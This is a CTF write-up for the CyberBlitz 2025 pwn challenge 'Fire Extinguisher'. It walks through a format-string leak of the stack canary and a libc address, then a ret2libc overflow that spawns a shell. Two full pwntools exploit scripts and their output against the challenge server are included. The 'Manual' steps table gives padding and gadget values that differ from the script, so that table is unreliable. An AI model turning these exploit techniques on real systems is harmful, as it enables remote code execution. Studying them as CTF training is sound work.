---
title: Fire Extinguisher
author: yufong
event: CyberBlitz 2025
categories:  [CyberBlitz 2025, Pwn]
date: 2025-12-24
tags: 
  - ret2libc
  - 64-bit
  - canary
  - piebase
info:
  description: "HELP MY ENTIRE HOUSE IS ON FIRE"
  difficulty: 2
solved: yes
img_path: /_posts/Writeups/CTF/CyberBlitz%202025/Pwn/Fire%20Extinguisher/attachments/
image:
  path: /_posts/Writeups/CTF/CyberBlitz%202025/Pwn/Toy%20Gadgets/attachments/cyberblitz2025.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Challenge Description

{{page.info.description}}

## Exploit

### Check Security

```
~/labs/ctf/cyberblitz2025/pwn/fire_extinguisher
❯ file fire-extinguisher
fire-extinguisher: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=137d43f9e9bd65ccaefcfb066a418c82c96c15f2, for GNU/Linux 3.2.0, with debug_info, not stripped
```

>Breakdown
>- The binary is not stripped, meaning symbol information is preserved.
>- Function names (e.g. `main`, `win`) and symbol addresses are available.
>- TLDR, easier to rev.

```
~/labs/ctf/cyberblitz2025/pwn/fire_extinguisher
❯ checksec --file=fire-extinguisher --format=json | jq
{
  "fire-extinguisher": {
    "relro": "partial",
    "canary": "yes",
    "nx": "yes",
    "pie": "yes",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "3"
  }
}
```

>Breakdown
>- `canary: yes`
>	- Stack canary protection is enabled.
>	- The return address cannot be overwritten directly. 
>	- No simple buffer overflow here.
>- `nx:yes`
>	- The stack is non-executable, preventing injected shellcode from running.
>	- Don't matter here since its a `ret2libc` challenge.
>- `pie:yes`
>	- The binary is loaded at a randomized base address.
>	- A PIE leak is required to calculate the correct runtime address of the target function.

### Vulnerability Analysis

Decompile and disassemble with ghidra

![]({{ page.img_path }}fire_extinguisher-1766518301420.png)

![]({{ page.img_path }}fire_extinguisher-1766517002775.png)

```
higher addresses
────────────────────────
saved RIP
saved RBP
stack canary (FS:0x28)  ← checked at end via __stack_chk_fail
preamble2[16]           (Stack[-0x28])
preamble1[16]           (Stack[-0x38])
fire[16]                (Stack[-0x48])
extinguish[16]          (Stack[-0x58])
────────────────────────
lower addresses
```

There are two buffer overflow vulnerability in this program

1. `read(0,fire,0x20)`
	- This vulnerability is utilized to create a format string vulnerability later at `printf(preamble1, fire)` in order to leak addresses from the stack.
	- `fire[16]` fire is allocated 16 bytes on the stack.   
	- `read()` writes 32 bytes (0x20) into the buffer, causing a stack-based buffer overflow.
	- The overflow proceeds toward higher stack addresses and overwrites the local variable `preamble1`.
	- By overwriting `preamble1` with format specifiers such as `%p`, the attacker controls the format string used by `printf`, allowing memory addresses to be leaked.

2. `fgets(extinguish, 1000, stdin)`
	- This vulnerability is utilized to gain control of execution flow (e.g. ret2libc).
	- `extinguish[16]` is allocated 16 bytes on the stack.
	- `fgets()` is called with an excessively large size (1000), causing a stack-based buffer overflow
	- The overflow proceeds toward higher stack addresses, overwriting `fire`, `preamble1`, `preamble2`, the stack `canary`, saved `RBP`, and saved `RIP`.
	- After leaking the stack canary in the first stage, this overflow can be utilized to overwrite RIP while preserving the canary.

### Find Offset to Preamble1

1. Generate payload to overwrite `preamble1`

	```
	❯ python2 -c 'print("A"*16+"B"*16)'
	AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB
	```

	> Payload Breakdown
	>- `fire[16]` is allocated 16 bytes on the stack.
	>- Writing 16 bytes fills `fire` completely.
	>- The next bytes overflow into the next local variable at a higher stack address, `preamble1[16]`.
	>- Therefore, we send 16 'A's followed by 16 'B's to fully overwrite `preamble1`.
	>- If we see 16Bs followed by `extinguish>`, we found the offset.

2. Crash the program

	```
	pwndbg> r
	Starting program: /home/kali/labs/ctf/cyberblitz2025/pwn/fire_extinguisher/fire-extinguisher
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	welcome to the fire extinguisher!
	-----
	what fire are we putting out? > AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB
	BBBBBBBBBBBBBBBBextinguish! >extinguish! >[Inferior 1 (process 1246018) exited normally]
	pwndbg>
	```

	> To Note
	>- Offset to `preamble1`: 16

### Find Canary Offset

1. View disassembled `main`
	![]({{ page.img_path }}fire_extinguisher-1766521395719.png)

	```
	local_10   (canary)     Stack[-0x10]
	preamble2               Stack[-0x28]
	preamble1               Stack[-0x38]
	fire                    Stack[-0x48]
	extinguish              Stack[-0x58]
	```

	> Calculate Canary Offset
	>- `0x58 - 0x10 = 0x48 (72)`

### Leak Canary Address

1. `fuzz.py`

	```python
	from pwn import *
	import sys
	
	exe = "./fire-extinguisher"
	context.binary = exe
	context.log_level = "warning"
	
	def start(argv=[], *a, **kw):
	    if args.GDB:
	        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	    else:
	        return process(exe)
	
	gdbscript = """
	b *main
	c
	"""
	PADDING = 16
	# Fuzz positional leaks. Start at 1, not 0.
	for i in range(100):
	    try:
	        p = start()
	        fmt = f"%{i}$p"
	        payload = "A"*PADDING + fmt
	        p.sendafter(b"what fire are we putting out? > ", payload)
	        out = p.recvuntil(b"extinguish! >", timeout=1)
	        print(f"{i}: {out.decode(errors='ignore').strip().split(" ")[0]}")
	
	        p.close()
	    except (EOFError, PwnlibException):
	        pass
	
	```

2. Leak addresses with `fuzz.py`

	```
	~/labs/ctf/cyberblitz2025/pwn/fire_extinguisher
	❯ python3 fuzz.py | grep -e "00$"
	/home/kali/labs/ctf/cyberblitz2025/pwn/fire_extinguisher/fuzz.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
	  p.sendafter(b"what fire are we putting out? > ", payload)
	15: 0xe1ce5c37e4de4100
	26: 0x7ffff7ffd000
	35: 0xc15b6335997d8700
	```

	> Canary Address Candidates
	>- `26: 0x7ffff7ffd000`
	>	- Unlikely to be the canary as the address is page-aligned and consistently (always `0x7...`).
	>	- Falls within the libc / loader address range.
	>- `15: 0xe1ce5c37e4de4100`
	>	- Although this value is randomized and ends with a null byte, it appears too early in the printf argument list.
	>- `35: 0xc15b6335997d8700`
	>	- Most likely stack canary candidate.
	>	- The value is randomized on each execution, consistently ends with a null byte.
	>- Canary Index: `35`

### Leak LIBC Address

1. Find LIBC Base Address from `pwndbg`

	```
	pwndbg> vmmap
	LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
	             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
	    0x555555554000     0x555555555000 r--p     1000       0 fire-extinguisher
	    0x555555555000     0x555555556000 r-xp     1000    1000 fire-extinguisher
	    0x555555556000     0x555555557000 r--p     1000    2000 fire-extinguisher
	    0x555555557000     0x555555558000 r--p     1000    2000 fire-extinguisher
	    0x555555558000     0x555555559000 rw-p     1000    3000 fire-extinguisher
	    0x7ffff7dab000     0x7ffff7dae000 rw-p     3000       0 [anon_7ffff7dab]
	    0x7ffff7dae000     0x7ffff7dd6000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
	    0x7ffff7dd6000     0x7ffff7f3b000 r-xp   165000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
	    0x7ffff7f3b000     0x7ffff7f91000 r--p    56000  18d000 /usr/lib/x86_64-linux-gnu/libc.so.6
	    0x7ffff7f91000     0x7ffff7f95000 r--p     4000  1e2000 /usr/lib/x86_64-linux-gnu/libc.so.6
	    0x7ffff7f95000     0x7ffff7f97000 rw-p     2000  1e6000 /usr/lib/x86_64-linux-gnu/libc.so.6
	    0x7ffff7f97000     0x7ffff7fa4000 rw-p     d000       0 [anon_7ffff7f97]
	    0x7ffff7fbf000     0x7ffff7fc1000 rw-p     2000       0 [anon_7ffff7fbf]
	    0x7ffff7fc1000     0x7ffff7fc5000 r--p     4000       0 [vvar]
	    0x7ffff7fc5000     0x7ffff7fc7000 r-xp     2000       0 [vdso]
	    0x7ffff7fc7000     0x7ffff7fc8000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
	    0x7ffff7fc8000     0x7ffff7ff0000 r-xp    28000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
	    0x7ffff7ff0000     0x7ffff7ffb000 r--p     b000   29000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
	    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   34000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
	    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
	    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000       0 [anon_7ffff7ffe]
	    0x7ffffffdd000     0x7ffffffff000 rw-p    22000       0 [stack]
	```

	> To Note
	>- LIBC Base Address: `0x7ffff7dae000`

2. Leak addresses with `fuzz.py`

	```
	❯ python3 fuzz.py | grep 0x7                                                                             
	/home/kali/labs/ctf/cyberblitz2025/pwn/fire_extinguisher/fuzz.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See
	 https://docs.pwntools.com/#bytes
	  p.sendafter(b"what fire are we putting out? > ", payload)
	1: 0x7fffffffdc00:
	2: 0x7fffffffdc00:
	10: 0x7325207024303125
	17: 0x7ffff7dd7ca8
	18: 0x7fffffffdd40
	21: 0x7fffffffdd58
	22: 0x7fffffffdd58
	25: 0x7fffffffdd68
	26: 0x7ffff7ffd000
	33: 0x7fffffffdd58
	36: 0x7fffffffdd50
	37: 0x7ffff7dd7d65
	40: 0x7ffff7ffe310
	44: 0x7fffffffdd50
	```

	> LIBC Function Address
	>- `0x7ffff7dd7ca8`

3. Verify `0x7ffff7dd7ca8` points to `libc`

	```
	pwndbg> x 0x7ffff7dd7ca8
	0x7ffff7dd7ca8 <__libc_start_call_main+120>:    0x91e8c789
	pwndbg>
	```

4. Find the offset to `libc` base address

	```
	pwndbg> x 0x7ffff7dd7ca8
	0x7ffff7dd7ca8 <__libc_start_call_main+120>:    0x91e8c789
	pwndbg> x 0x7ffff7dd7ca8 - 0x7ffff7dae000
	0x29ca8:        Cannot access memory at address 0x29ca8
	pwndbg>
	```

	> Offset to LIBC Base
	>- `0x29ca8`

### Find Offsets to LIBC Functions

1. Find out where is `system` function

	```
	~/labs/ctf/cyberblitz2025/pwn/fire_extinguisher
	❯  readelf -s libc.so.6| grep system
	  1054: 0000000000053110    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
	```

	>Breakdown
	>- The value `0x53110` is the offset of `system` from the libc base, not its absolute address.
	>- `system_addr = libc_base + 0000000000053110`.

2. Find the string literal `/bin/sh` in `libc`

	```
	~/labs/ctf/cyberblitz2025/pwn/fire_extinguisher
	❯ strings -a -t x libc.so.6 | grep "/bin/sh"
	 1a7ea4 /bin/sh
	```

	>Breakdown
	>- The string `"/bin/sh"` exists as a string inside libc.
	>- `binsh_addr = libc_base + 0x1a7ea4`

### Find Gadgets

To build a ret2libc chain on 64-bit, we need a `pop rdi; ret` gadget to set up the first argument to `system`, and a standalone `ret` gadget to satisfy 16-byte stack alignment.  

Since the binary is PIE and its base address is unknown, gadgets in `fire-extinguisher` cannot be used reliably, so all gadgets are taken from `libc`, whose base address is derived from the leak.

1. Find `pop rdi` gadget

	```
	~/labs/ctf/cyberblitz2025/pwn/fire_extinguisher
	❯ ropper -f libc.so.6 --search "pop rdi"
	
	[INFO] Load gadgets from cache
	[LOAD] loading... 100%
	[LOAD] removing double gadgets... 100%
	[INFO] Searching for gadgets: pop rdi
	
	[INFO] File: libc.so.6
	...SNIP...
	0x000000000002a145: pop rdi; ret;
	```

	> To Note
	>- Address: `0x2a145`

2. Find `ret` gadget

	```
	~/labs/ctf/cyberblitz2025/pwn/fire_extinguisher 8s
	❯ ropper -f libc.so.6 --search "ret;"
	
	[INFO] Load gadgets from cache
	[LOAD] loading... 100%
	[LOAD] removing double gadgets... 100%
	[INFO] Searching for gadgets: ret;
	
	[INFO] File: libc.so.6
	0x000000000002846b: ret;
	```

	> To Note
	>- Address: `0x2846b`

### Manual

Steps

| Step | Purpose                 | Value                     |
| ---- | ----------------------- | ------------------------- |
| 1    | Padding to Canary       | `104`                     |
| 2    | Canary                  | Canary Address at Runtime |
| 3    | Padding to RBP          | `8`                       |
| 4    | Stack alignment (`ret`) | `libc_base + 0x2846b`     |
| 5    | `pop rdi; ret;`         | `libc_base + 0x2846b`     |
| 6    | `/bin/sh`               | `libc_base + 0x1a7ea4`    |
| 7    | `system`                | `libc_base + 0x53110`     |

> Also, don't forget LIBC Leak.

Make changes to "CHANGE ME" section

```python
from pwn import *
import sys

exe = "./fire-extinguisher"
elf = context.binary = ELF(exe, checksec=False)

# Use system libc (no provided libs)

context.log_level = "debug"

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    return process([exe] + argv, *a, **kw)

# CHANGE ME
OFFSET_TO_CANARY = 72
OFFSET_TO_RBP    = 8
CANARY_IDX = 35
LIBC_IDX   = 17
LIBC_LEAK_OFF = 0x29ca8
RET_OFF = 0x2846b
POP_RDI_OFF = 0x2a145
BINSH_OFF = 0x1a7ea4
SYSTEM_OFF = 0x53110
# END


def parse_ptr(x: bytes) -> int:
    return int(x.strip(), 16)

def main():
    io = start()

    # ---- Stage 1: leak canary + libc ptr ----
    fmt = ("A" * 16 + f"%{CANARY_IDX}$p.%{LIBC_IDX}$p").encode()
    io.sendafter(b"what fire are we putting out? > ", fmt)

    leak_blob = io.recvuntil(b"extinguish! >", drop=True)
    leak_line = leak_blob.split(b"\n")[-1].strip()

    parts = leak_line.split(b".")
    if len(parts) != 2:
        log.failure(f"bad leak parse: {parts}")
        log.failure(f"raw: {leak_blob!r}")
        return
    
    canary    = parse_ptr(parts[0])
    libc_leak = parse_ptr(parts[1])

    log.success(f"canary    = {canary:#x}")
    log.success(f"libc leak = {libc_leak:#x}")

    # ---- libc base via constant offset ----
    libc_base = libc_leak - LIBC_LEAK_OFF
    log.success(f"libc base = {libc_base:#x}")

    # ---- gadgets/symbols from system libc ----
    ret     = libc_base + RET_OFF
    pop_rdi = libc_base + POP_RDI_OFF
    system = libc_base + SYSTEM_OFF
    binsh  = libc_base + BINSH_OFF

    log.info(f"ret     = {ret:#x}")
    log.info(f"pop rdi = {pop_rdi:#x}")
    log.info(f"system  = {system:#x}")
    log.info(f"binsh   = {binsh:#x}")

    # ---- Stage 2: overflow (fgets) ----
    payload = flat([
        b"A" * OFFSET_TO_CANARY,
        canary,
        b"B" * OFFSET_TO_RBP,
        ret,        # alignment
        pop_rdi,
        binsh,
        system,
    ])

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

Exploit 

```
~/labs/ctf/cyberblitz2025/pwn/fire_extinguisher
❯ python3 manual.py REMOTE blitzinstance1.ddns.net 33527
[+] Opening connection to blitzinstance1.ddns.net on port 33527: Done
[DEBUG] Received 0x48 bytes:
    b'welcome to the fire extinguisher!\n'
    b'-----\n'
    b'what fire are we putting out? > '
[DEBUG] Sent 0x1b bytes:
    b'AAAAAAAAAAAAAAAA%35$p.%17$p'
[DEBUG] Received 0x2e bytes:
    b'0x8de803e3b2f70d00.0x773984329ca8extinguish! >'
[+] canary    = 0x8de803e3b2f70d00
[+] libc leak = 0x773984329ca8
[+] libc base = 0x773984300000
[*] ret     = 0x77398432846b
[*] pop rdi = 0x77398432a145
[*] system  = 0x773984353110
[*] binsh   = 0x7739844a7ea4
[DEBUG] Sent 0x79 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  00 0d f7 b2  e3 03 e8 8d  │AAAA│AAAA│····│····│
    00000050  42 42 42 42  42 42 42 42  6b 84 32 84  39 77 00 00  │BBBB│BBBB│k·2·│9w··│
    00000060  45 a1 32 84  39 77 00 00  a4 7e 4a 84  39 77 00 00  │E·2·│9w··│·~J·│9w··│
    00000070  10 31 35 84  39 77 00 00  0a                        │·15·│9w··│·│
    00000079
[*] Switching to interactive mode
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x41 bytes:
    b'CyberBlitz2025{p0uring_w4ter_on_a_gr34S3_f1r3_ju5t_to_f33l_al1v3}'
CyberBlitz2025{p0uring_w4ter_on_a_gr34S3_f1r3_ju5t_to_f33l_al1v3}$
```

<video muted autoplay controls style="width: 740px; height: 460px;">
    <source src="{{site.cdn}}{{page.img_path}}hezIjmbRSx.mp4" type="video/mp4">
</video>


### Auto

Mostly automated, make changes to "CHANGE ME" section.

```python
from pwn import *
import sys

exe = "./fire-extinguisher"
elf = context.binary = ELF(exe, checksec=False)

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

context.log_level = "debug"

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    return process([exe] + argv, *a, **kw)

# CHANGE ME
OFFSET_TO_CANARY = 72
OFFSET_TO_RBP    = 8
CANARY_IDX = 35
LIBC_IDX   = 17
LIBC_LEAK_OFF = 0x29ca8
# END


def parse_ptr(x: bytes) -> int:
    return int(x.strip(), 16)

def main():
    io = start()

    # ---- Stage 1: leak canary + libc ptr ----
    fmt = ("A" * 16 + f"%{CANARY_IDX}$p.%{LIBC_IDX}$p").encode()  # keep delimiter
    io.sendafter(b"what fire are we putting out? > ", fmt)

    leak_blob = io.recvuntil(b"extinguish! >", drop=True)  # consumes the prompt too
    leak_line = leak_blob.split(b"\n")[-1].strip()

    parts = leak_line.split(b".")
    if len(parts) != 2:
        log.failure(f"bad leak parse: {parts}")
        log.failure(f"raw: {leak_blob!r}")
        return

    canary    = parse_ptr(parts[0])
    libc_leak = parse_ptr(parts[1])

    log.success(f"canary    = {canary:#x}")
    log.success(f"libc leak = {libc_leak:#x}")

    # ---- libc base via constant offset ----
    libc.address = libc_leak - LIBC_LEAK_OFF
    log.success(f"libc base = {libc.address:#x}")

    # ---- gadgets/symbols from system libc ----
    rop = ROP(libc)
    ret     = rop.find_gadget(["ret"]).address
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address

    system = libc.sym["system"]
    exit_  = libc.sym["exit"]
    binsh  = next(libc.search(b"/bin/sh\x00"))

    log.info(f"ret     = {ret:#x}")
    log.info(f"pop rdi = {pop_rdi:#x}")
    log.info(f"system  = {system:#x}")
    log.info(f"exit    = {exit_:#x}")
    log.info(f"binsh   = {binsh:#x}")

    # ---- Stage 2: overflow (fgets) ----
    payload = flat([
        b"A" * OFFSET_TO_CANARY,
        canary,
        b"B" * OFFSET_TO_RBP,
        ret,        # alignment
        pop_rdi,
        binsh,
        system,

    ])
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

<video muted autoplay controls style="width: 740px; height: 460px;">
    <source src="{{site.cdn}}{{page.img_path}}Xui51gi7M4.mp4" type="video/mp4">
</video>


